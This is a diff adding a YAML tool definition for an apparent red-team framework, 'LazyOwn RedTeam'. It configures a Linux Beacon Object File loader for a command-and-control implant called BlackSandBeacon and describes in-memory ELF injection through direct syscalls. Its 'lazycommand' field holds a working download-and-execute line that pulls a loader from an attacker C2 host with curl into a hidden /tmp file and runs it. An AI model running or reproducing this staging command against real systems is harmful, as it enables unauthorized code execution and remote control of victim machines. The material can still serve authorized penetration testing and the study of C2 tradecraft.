@@ -1,0 +1,43 @@
+name: blacksandbeacon_bof
+description: 'Linux BOF (Beacon Object File) loader for BlackSandBeacon. Compiles
+  and stages the BOF runtime loader, then delivers a position-independent ELF shared
+  object (.so) to an active BlackSandBeacon session.
+
+  Linux BOF leverages direct syscalls and ELF dlopen injection — analogous to Windows
+  BOF but targeting Linux kernel internals via the /proc filesystem, io_uring, and
+  native assembly stubs. This brings the modular, in-memory extensibility of Windows
+  BOF to Linux engagements for the first time in an open-source framework.
+
+  Port a Windows BOF to Linux:
+    - Replace Win32 API calls with direct Linux syscalls or libc equivalents.
+    - Use the datap API (BeaconDataParse, BeaconDataInt, BeaconDataExtract) unchanged.
+    - Compile with: gcc -shared -fPIC -nostartfiles -o mybof.so mybof.c
+
+  Usage:
+    blacksandbeacon_bof                  — compile bof_loader and stage it
+    blacksandbeacon_bof sessions/mybof.so — push a specific BOF to the session
+
+  '
+author: LazyOwn RedTeam
+version: '1.0'
+enabled: true
+params:
+- name: lhost
+  type: string
+  required: true
+  description: Attacker C2 IP or hostname.
+- name: lport
+  type: string
+  required: true
+  description: C2 staging port where the bof_loader binary is served.
+tool:
+  name: blacksandbeacon_bof
+  repo_url: https://github.com/grisuno/blacksandbeacon.git
+  install_path: external/.exploit/blacksandbeacon
+  install_command: make
+  execute_command: git restore . ; git pull ; make bof && cp bof_loader ../../../sessions/bof_loader
+    && echo "[blacksandbeacon_bof] BOF loader staged at sessions/bof_loader"
+  download_file: /tmp/.bof
+  lazycommand: curl -sk "http://{lhost}:{lport}/bof_loader" -o /tmp/.bof && chmod
+    +x /tmp/.bof && /tmp/.bof
+category: 10. Command & Control
